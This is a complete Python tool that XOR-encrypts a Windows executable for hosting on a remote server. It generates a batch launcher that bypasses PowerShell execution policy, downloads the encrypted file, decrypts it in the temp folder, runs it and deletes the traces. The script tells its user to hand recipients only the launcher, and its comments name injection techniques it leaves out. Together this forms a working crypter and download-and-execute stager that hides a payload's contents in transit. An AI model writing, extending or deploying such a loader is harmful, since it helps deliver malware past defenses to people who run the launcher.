#!/usr/bin/env python3
"""
win_xor_pack.py — Linux tool (VPS download mode)

Encrypts a Windows PE you own (.exe or .bin that is a PE), writes:
  - encrypted payload to upload to your VPS
  - small .bat that downloads → decrypts → runs as its own process

Does NOT implement process injection (no Early Bird APC, no hollowing into msedge).

Interactive:  python3 win_xor_pack.py
CLI:          python3 win_xor_pack.py app.exe -o ./out --url https://vps/app.enc --compress
"""

from __future__ import annotations

import argparse
import gzip
import sys
from pathlib import Path

INTERNAL_KEY = "WinXorPack-FixedKey-v1"

SUPPORTED_SUFFIXES = {".exe", ".bin"}


def xor_crypt(data: bytes, key: bytes) -> bytes:
    if not key:
        raise ValueError("Key must not be empty")
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def looks_like_pe(data: bytes) -> bool:
    """MZ header check — PE/EXE/DLL usually start with MZ."""
    return len(data) >= 2 and data[0:2] == b"MZ"


def pack_payload(plain: bytes, key: bytes, compress: bool) -> tuple[bytes, str]:
    if compress:
        body = gzip.compress(plain, compresslevel=9)
        fmt = "gzip"
    else:
        body = plain
        fmt = "raw"
    return xor_crypt(body, key), fmt


def build_download_bat(key: str, url: str, fmt: str) -> str:
    """
    Thin launcher: download → XOR decrypt → optional gunzip → write temp .exe → Start-Process.
    Runs as a normal separate process (not injected into another app).
    """
    ps_key = key.replace("'", "''")
    ps_url = url.replace("'", "''")

    if fmt == "gzip":
        decompress_ps = (
            "$ms = New-Object System.IO.MemoryStream(,$dec); "
            "$gs = New-Object System.IO.Compression.GzipStream("
            "$ms, [System.IO.Compression.CompressionMode]::Decompress); "
            "$out = New-Object System.IO.MemoryStream; "
            "$gs.CopyTo($out); $gs.Close(); $dec = $out.ToArray(); "
        )
    else:
        decompress_ps = ""

    return f"""@echo off
setlocal
cd /d "%~dp0"

echo Downloading application payload...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  \"$ErrorActionPreference='Stop'; ^
  $url = '{ps_url}'; ^
  $key = [System.Text.Encoding]::UTF8.GetBytes('{ps_key}'); ^
  $fmt = '{fmt}'; ^
  $tmpEnc = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString() + '.enc'); ^
  $tmpExe = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString() + '.exe'); ^
  try {{ ^
    Invoke-WebRequest -Uri $url -OutFile $tmpEnc -UseBasicParsing; ^
    $enc = [System.IO.File]::ReadAllBytes($tmpEnc); ^
    $dec = New-Object byte[] $enc.Length; ^
    for ($i = 0; $i -lt $enc.Length; $i++) {{ $dec[$i] = $enc[$i] -bxor $key[$i %% $key.Length] }}; ^
    if ($fmt -eq 'gzip') {{ {decompress_ps} }}; ^
    if ($dec.Length -lt 2 -or $dec[0] -ne 0x4D -or $dec[1] -ne 0x5A) {{ ^
      throw 'Decrypted payload is not a Windows PE (missing MZ header).'; ^
    }}; ^
    [System.IO.File]::WriteAllBytes($tmpExe, $dec); ^
    $p = Start-Process -FilePath $tmpExe -Wait -PassThru; ^
    exit $p.ExitCode; ^
  }} finally {{ ^
    Remove-Item -LiteralPath $tmpEnc -Force -ErrorAction SilentlyContinue; ^
    Remove-Item -LiteralPath $tmpExe -Force -ErrorAction SilentlyContinue; ^
  }}\"

set ERR=%ERRORLEVEL%
if %ERR% NEQ 0 (
  echo.
  echo Failed to download or run the application.
  echo Check network, URL, and that the payload is a valid Windows program.
  pause
)
endlocal & exit /b %ERR%
"""


def prompt(msg: str, default: str | None = None) -> str:
    suffix = f" [{default}]" if default is not None else ""
    while True:
        val = input(f"{msg}{suffix}: ").strip()
        if val:
            return val
        if default is not None:
            return default
        print("  Please enter a value.")


def prompt_yes_no(msg: str, default: bool = False) -> bool:
    d = "Y/n" if default else "y/N"
    while True:
        val = input(f"{msg} [{d}]: ").strip().lower()
        if not val:
            return default
        if val in ("y", "yes"):
            return True
        if val in ("n", "no"):
            return False
        print("  Enter y or n.")


def interactive() -> tuple[Path, Path, str, bool, Path]:
    print()
    print("=" * 60)
    print("  Windows XOR Packer — VPS download mode")
    print("  Supports .exe and .bin (PE binaries)")
    print("  Runs as a normal separate process (no process injection)")
    print("=" * 60)
    print()

    while True:
        path_s = prompt("Path to unencrypted Windows program (.exe or .bin)")
        path = Path(path_s).expanduser().resolve()
        if not path.is_file():
            print(f"  File not found: {path}")
            continue
        suf = path.suffix.lower()
        if suf not in SUPPORTED_SUFFIXES:
            print(f"  Unsupported extension {suf!r}. Use .exe or .bin")
            continue
        data = path.read_bytes()
        if not looks_like_pe(data):
            print("  Warning: file does not start with MZ (not a typical PE).")
            if not prompt_yes_no("  Continue anyway?", default=False):
                continue
        break

    default_dir = str(Path.cwd() / "xor_out")
    out_dir = Path(prompt("Output directory", default_dir)).expanduser().resolve()
    out_dir.mkdir(parents=True, exist_ok=True)

    payload_name = prompt("Encrypted payload filename on VPS", "app.enc")
    payload_path = out_dir / payload_name

    print()
    print("Public URL where the payload will be available AFTER upload:")
    print("  Example: https://your-vps.example.com/downloads/app.enc")
    url = prompt("Download URL")
    if not url.startswith(("http://", "https://")):
        print("  Warning: URL should usually start with http:// or https://")

    compress = prompt_yes_no("Compress with gzip before XOR?", default=True)

    launcher_path = Path(
        prompt("Launcher .bat path", str(out_dir / "run.bat"))
    ).expanduser().resolve()
    launcher_path.parent.mkdir(parents=True, exist_ok=True)

    print()
    print("Summary")
    print(f"  Input        : {path}")
    print(f"  Payload file : {payload_path}  (upload to VPS)")
    print(f"  Public URL   : {url}")
    print(f"  Compress     : {'yes' if compress else 'no'}")
    print(f"  Launcher     : {launcher_path}")
    print(f"  Run mode     : normal separate process (Start-Process)")
    print()
    if not prompt_yes_no("Proceed?", default=True):
        sys.exit("Cancelled.")

    return path, payload_path, url, compress, launcher_path


def run_pack(
    src_path: Path,
    payload_path: Path,
    url: str,
    compress: bool,
    launcher_path: Path,
    key: str,
) -> None:
    key_b = key.encode("utf-8")
    plain = src_path.read_bytes()
    encrypted, fmt = pack_payload(plain, key_b, compress)

    payload_path.parent.mkdir(parents=True, exist_ok=True)
    payload_path.write_bytes(encrypted)

    bat = build_download_bat(key, url, fmt)
    launcher_path.write_text(bat, encoding="utf-8", newline="\r\n")

    print()
    print("Done.")
    print(f"  Input size       : {len(plain):,} bytes")
    print(f"  Encrypted payload: {payload_path} ({len(encrypted):,} bytes, {fmt})")
    print(f"  Launcher         : {launcher_path}")
    print()
    print("Next steps:")
    print(f"  1. Upload {payload_path.name} so this URL works:")
    print(f"       {url}")
    print(f"  2. Give users only {launcher_path.name}")
    print("  3. Double-click → download → decrypt → run as its own process")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="XOR-pack .exe/.bin for VPS hosting; thin .bat downloads and runs it."
    )
    parser.add_argument("input", nargs="?", help="Path to .exe or .bin (omit for interactive)")
    parser.add_argument("-o", "--output-dir", default=None, help="Output directory")
    parser.add_argument("--url", default=None, help="Public URL of encrypted payload")
    parser.add_argument("--payload-name", default="app.enc", help="Payload filename")
    parser.add_argument("--compress", action="store_true")
    parser.add_argument("--no-compress", action="store_true")
    parser.add_argument("-i", "--interactive", action="store_true")
    parser.add_argument("-k", "--key", default=None)
    args = parser.parse_args()

    key = args.key if args.key else INTERNAL_KEY
    use_interactive = args.interactive or not args.input or not args.url

    if use_interactive:
        src_path, payload_path, url, compress, launcher_path = interactive()
        if args.compress:
            compress = True
        if args.no_compress:
            compress = False
    else:
        src_path = Path(args.input).expanduser().resolve()
        if not src_path.is_file():
            sys.exit(f"Input not found: {src_path}")
        if src_path.suffix.lower() not in SUPPORTED_SUFFIXES:
            sys.exit("Input must be .exe or .bin")
        out_dir = Path(args.output_dir or "./xor_out").expanduser().resolve()
        out_dir.mkdir(parents=True, exist_ok=True)
        payload_path = out_dir / args.payload_name
        launcher_path = out_dir / "run.bat"
        url = args.url
        compress = bool(args.compress) and not args.no_compress

    run_pack(src_path, payload_path, url, compress, launcher_path, key)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nCancelled.")
        sys.exit(130)
